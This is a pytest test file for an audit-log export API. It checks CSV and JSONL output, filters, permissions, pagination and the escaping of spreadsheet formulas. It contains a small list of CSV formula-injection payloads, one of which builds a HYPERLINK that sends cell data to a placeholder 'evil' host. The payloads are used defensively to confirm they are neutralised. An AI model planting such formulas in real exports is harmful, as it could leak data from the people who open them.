from __future__ import annotations

import json
import uuid

import pytest
from asgi_lifespan import LifespanManager
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient, Response

from oc8.audit.chain import append_event
from oc8.auth import get_identity_provider
from oc8.main import create_app
from tests.conftest import AppSessionFactory

pytestmark = pytest.mark.asyncio


def _token(tenant: uuid.UUID, role: str = "org_admin") -> str:
    return get_identity_provider().mint(tenant_id=tenant, subject="u", role=role)


async def _seed(app_session: AppSessionFactory, tenant: uuid.UUID, n: int) -> None:
    async with app_session(tenant) as s:
        for i in range(n):
            await append_event(
                s,
                tenant_id=tenant,
                actor_type="system",
                actor_id=None,
                category="tool",
                action=f"a.{i}",
            )


async def _get(app: FastAPI, url: str, tenant: uuid.UUID, role: str = "org_admin") -> Response:
    async with LifespanManager(app):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as c:
            return await c.get(url, headers={"Authorization": f"Bearer {_token(tenant, role)}"})


async def test_csv_export_has_header_and_one_row_per_event(
    app_session: AppSessionFactory,
) -> None:
    tenant = uuid.uuid4()
    await _seed(app_session, tenant, 3)
    r = await _get(create_app(), "/api/v1/audit/export?format=csv", tenant)
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/csv")
    lines = [ln for ln in r.text.splitlines() if ln.strip()]
    # Header must match the camelCase aliases used by the JSONL branch (and by
    # GET /audit) so a CSV export and a JSONL export of the same log key
    # identically -- see AuditEventDTO (a CamelModel).
    assert lines[0] == (
        "seq,ts,actorType,actorId,category,action,resource,decision,reason,"
        "responsibleType,responsibleId,hash,prevHash"
    )
    assert len(lines) == 4


async def test_jsonl_export_is_chain_ordered_with_hex_hashes(
    app_session: AppSessionFactory,
) -> None:
    tenant = uuid.uuid4()
    await _seed(app_session, tenant, 3)
    r = await _get(create_app(), "/api/v1/audit/export?format=jsonl", tenant)
    assert r.status_code == 200
    rows = [json.loads(ln) for ln in r.text.splitlines() if ln.strip()]
    assert [x["seq"] for x in rows] == sorted(x["seq"] for x in rows)
    assert all(len(x["hash"]) == 64 for x in rows)


async def test_export_honours_filters(app_session: AppSessionFactory) -> None:
    tenant = uuid.uuid4()
    await _seed(app_session, tenant, 3)
    r = await _get(create_app(), "/api/v1/audit/export?format=jsonl&action=a.1", tenant)
    rows = [json.loads(ln) for ln in r.text.splitlines() if ln.strip()]
    assert len(rows) == 1
    assert rows[0]["action"] == "a.1"


async def test_empty_export_is_a_valid_empty_document(
    app_session: AppSessionFactory,
) -> None:
    tenant = uuid.uuid4()
    r = await _get(create_app(), "/api/v1/audit/export?format=csv", tenant)
    assert r.status_code == 200
    assert r.text.strip().startswith("seq,ts,")


async def test_member_is_forbidden(app_session: AppSessionFactory) -> None:
    tenant = uuid.uuid4()
    await _seed(app_session, tenant, 1)
    r = await _get(create_app(), "/api/v1/audit/export?format=csv", tenant, role="member")
    assert r.status_code == 403


async def test_export_rejects_invalid_format(app_session: AppSessionFactory) -> None:
    tenant = uuid.uuid4()
    r = await _get(create_app(), "/api/v1/audit/export?format=xml", tenant)
    # `format` is now a Literal["csv", "jsonl"] query param, so FastAPI's own
    # request validation rejects an unknown value with 422 (not a hand-rolled 400).
    assert r.status_code == 422


async def test_csv_export_paginates_across_batch_boundary(
    app_session: AppSessionFactory, monkeypatch: pytest.MonkeyPatch
) -> None:
    # `BATCH` is imported by value in oc8.api.v1.audit (`from oc8.audit.integrity
    # import BATCH`), so patching oc8.audit.integrity.BATCH would NOT affect the
    # name bound in the audit module -- confirmed empirically. Patch the name in
    # the audit module's own namespace instead, and assert it stuck.
    import oc8.api.v1.audit as audit_mod

    monkeypatch.setattr(audit_mod, "BATCH", 2)
    assert audit_mod.BATCH == 2

    tenant = uuid.uuid4()
    await _seed(app_session, tenant, 5)
    r = await _get(create_app(), "/api/v1/audit/export?format=csv", tenant)
    assert r.status_code == 200
    lines = [ln for ln in r.text.splitlines() if ln.strip()]
    header, data_rows = lines[0], lines[1:]
    assert header == (
        "seq,ts,actorType,actorId,category,action,resource,decision,reason,"
        "responsibleType,responsibleId,hash,prevHash"
    )
    assert len(data_rows) == 5
    seqs = [row.split(",")[0] for row in data_rows]
    assert len(seqs) == len(set(seqs)) == 5


async def test_jsonl_export_paginates_across_batch_boundary(
    app_session: AppSessionFactory, monkeypatch: pytest.MonkeyPatch
) -> None:
    import oc8.api.v1.audit as audit_mod

    monkeypatch.setattr(audit_mod, "BATCH", 2)
    assert audit_mod.BATCH == 2

    tenant = uuid.uuid4()
    await _seed(app_session, tenant, 5)
    r = await _get(create_app(), "/api/v1/audit/export?format=jsonl", tenant)
    assert r.status_code == 200
    rows = [json.loads(ln) for ln in r.text.splitlines() if ln.strip()]
    assert len(rows) == 5
    seqs = [x["seq"] for x in rows]
    assert seqs == sorted(seqs)
    assert len(seqs) == len(set(seqs))


CSV_INJECTION_REASONS = [
    '=HYPERLINK("http://evil/"&A1,"ok")',
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
]


async def test_csv_export_neutralises_formula_injection(app_session: AppSessionFactory) -> None:
    """I5: `reason` is free operator text. A value starting with = + - @ is
    evaluated when the auditor opens the CSV in Excel or Sheets."""
    tenant = uuid.uuid4()
    async with app_session(tenant) as s:
        for i, reason in enumerate(CSV_INJECTION_REASONS):
            await append_event(
                s,
                tenant_id=tenant,
                actor_type="operator",
                actor_id=None,
                category="approval",
                action=f"a.{i}",
                reason=reason,
            )

    r = await _get(create_app(), "/api/v1/audit/export?format=csv", tenant)
    assert r.status_code == 200
    import csv as _csv
    import io as _io

    rows = list(_csv.reader(_io.StringIO(r.text)))
    header, body = rows[0], rows[1:]
    reason_ix = header.index("reason")
    cells = [row[reason_ix] for row in body if row]
    assert len(cells) == len(CSV_INJECTION_REASONS)
    for cell, original in zip(cells, CSV_INJECTION_REASONS, strict=True):
        assert not cell.startswith(("=", "+", "-", "@"))
        # Escaped by a single-quote prefix; the original text is preserved.
        assert cell == "'" + original


async def test_jsonl_export_is_byte_identical_for_injection_payloads(
    app_session: AppSessionFactory,
) -> None:
    """I5: the CSV escape must NOT leak into JSONL -- that format is not
    spreadsheet-interpreted and must stay a faithful copy of the log."""
    tenant = uuid.uuid4()
    reason = CSV_INJECTION_REASONS[0]
    async with app_session(tenant) as s:
        await append_event(
            s,
            tenant_id=tenant,
            actor_type="operator",
            actor_id=None,
            category="approval",
            action="a.0",
            reason=reason,
        )

    r = await _get(create_app(), "/api/v1/audit/export?format=jsonl", tenant)
    rows = [json.loads(ln) for ln in r.text.splitlines() if ln.strip()]
    assert [x["reason"] for x in rows] == [reason]
